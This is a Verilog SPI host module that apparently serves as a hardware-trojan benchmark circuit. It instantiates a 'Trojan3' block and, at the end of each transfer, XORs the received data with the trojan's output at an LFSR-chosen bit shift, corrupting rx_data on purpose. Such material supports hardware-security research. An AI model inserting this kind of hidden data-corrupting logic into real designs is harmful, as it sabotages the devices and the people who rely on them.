// SPI Host Circuit for Trojan3
// Fixed I/O to match Trojan3: clk, rst, data_in[15:0] -> data_out[15:0]
module trojan3_spi_host #(
    parameter [27:0] SPI_SEED = 28'hABCDEF1,
    parameter CLK_DIV = 8,
    parameter DATA_WIDTH = 16
)(
    input wire clk,
    input wire rst,
    input wire [DATA_WIDTH-1:0] tx_data,
    input wire tx_start,
    input wire spi_miso,
    output reg [DATA_WIDTH-1:0] rx_data,
    output reg spi_sclk,
    output reg spi_mosi,
    output reg spi_cs_n,
    output reg tx_done,
    output reg rx_valid
);

    // Trojan interface (fixed width)
    wire [15:0] trojan_data_in;
    wire [15:0] trojan_data_out;
    
    // SPI control signals
    reg [DATA_WIDTH-1:0] tx_shift_reg;
    reg [DATA_WIDTH-1:0] rx_shift_reg;
    reg [$clog2(CLK_DIV)-1:0] clk_counter;
    reg [$clog2(DATA_WIDTH)-1:0] bit_counter;
    reg [2:0] spi_state;
    reg [27:0] spi_gen;
    reg sclk_enable;

    // SPI pattern generation for "shift count of the trojaned bit"
    always @(posedge clk or posedge rst) begin
        if (rst)
            spi_gen <= SPI_SEED;
        else
            spi_gen <= {spi_gen[26:0], spi_gen[27] ^ spi_gen[20] ^ spi_gen[13] ^ spi_gen[6]};
    end

    wire [$clog2(DATA_WIDTH)-1:0] shift_count = spi_gen[$clog2(DATA_WIDTH)-1:0];
    
    assign trojan_data_in = 16'h0;

    wire [DATA_WIDTH-1:0] trojan_data_out_shifted;
    assign trojan_data_out_shifted = (shift_count == DATA_WIDTH - 1) ? {{(DATA_WIDTH-1){1'b0}}, 1'b1} : {{(DATA_WIDTH-16){1'b0}}, trojan_data_out} << shift_count;
    
    // SPI clock generation
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            clk_counter <= {($clog2(CLK_DIV)){1'b0}};
            spi_sclk <= 1'b0;
        end else if (sclk_enable) begin
            if (clk_counter >= CLK_DIV-1) begin
                clk_counter <= {($clog2(CLK_DIV)){1'b0}};
                spi_sclk <= ~spi_sclk;
            end else begin
                clk_counter <= clk_counter + 1;
            end
        end else begin
            spi_sclk <= 1'b0;
        end
    end
    
    wire sclk_edge = sclk_enable && (clk_counter == {($clog2(CLK_DIV)){1'b0}});
    
    // SPI state machine
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            spi_state <= 3'b000;
            spi_cs_n <= 1'b1;
            sclk_enable <= 1'b0;
            bit_counter <= {($clog2(DATA_WIDTH)){1'b0}};
            tx_done <= 1'b0;
            rx_valid <= 1'b0;
            // Initialize SPI outputs
            spi_mosi <= 1'b0;
        end else begin
            case (spi_state)
                3'b000: begin // IDLE
                    spi_cs_n <= 1'b1;
                    sclk_enable <= 1'b0;
                    tx_done <= 1'b0;
                    rx_valid <= 1'b0;
                    if (tx_start) begin
                        tx_shift_reg <= tx_data;
                        bit_counter <= {($clog2(DATA_WIDTH)){1'b0}};
                        spi_state <= 3'b001;
                    end
                end
                3'b001: begin // CS_ASSERT
                    spi_cs_n <= 1'b0;
                    sclk_enable <= 1'b1;
                    spi_state <= 3'b010;
                end
                3'b010: begin // TRANSFER
                    if (sclk_edge && spi_sclk) begin // Rising edge
                        spi_mosi <= tx_shift_reg[DATA_WIDTH-1];
                        tx_shift_reg <= tx_shift_reg << 1;
                    end else if (sclk_edge && !spi_sclk) begin // Falling edge
                        rx_shift_reg <= {rx_shift_reg[DATA_WIDTH-2:0], spi_miso};
                        if (bit_counter >= DATA_WIDTH-1) begin
                            spi_state <= 3'b011;
                        end else begin
                            bit_counter <= bit_counter + 1;
                        end
                    end
                end
                3'b011: begin // CS_DEASSERT
                    spi_cs_n <= 1'b1;
                    sclk_enable <= 1'b0;
                    // Mix received data with trojan output
                    rx_data <= rx_shift_reg ^ trojan_data_out_shifted;
                    tx_done <= 1'b1;
                    rx_valid <= 1'b1;
                    spi_state <= 3'b000;
                end
                default: spi_state <= 3'b000;
            endcase
        end
    end
    
    // Instantiate Trojan3
    Trojan3 trojan_inst (
        .clk(clk),
        .rst(rst),
        .data_in(trojan_data_in),
        .data_out(trojan_data_out)
    );

endmodule
